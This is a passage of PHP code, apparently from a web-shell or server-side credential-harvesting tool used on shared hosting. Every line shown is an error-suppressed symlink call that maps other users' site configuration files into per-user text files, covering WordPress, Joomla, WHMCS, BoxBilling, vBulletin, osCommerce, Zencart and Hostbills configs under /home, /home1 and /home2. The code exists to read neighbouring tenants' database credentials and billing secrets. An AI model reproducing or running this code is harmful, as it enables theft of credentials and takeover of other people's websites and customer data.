@symlink('/home/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home1

@symlink('/home1/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home1/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home2

@symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
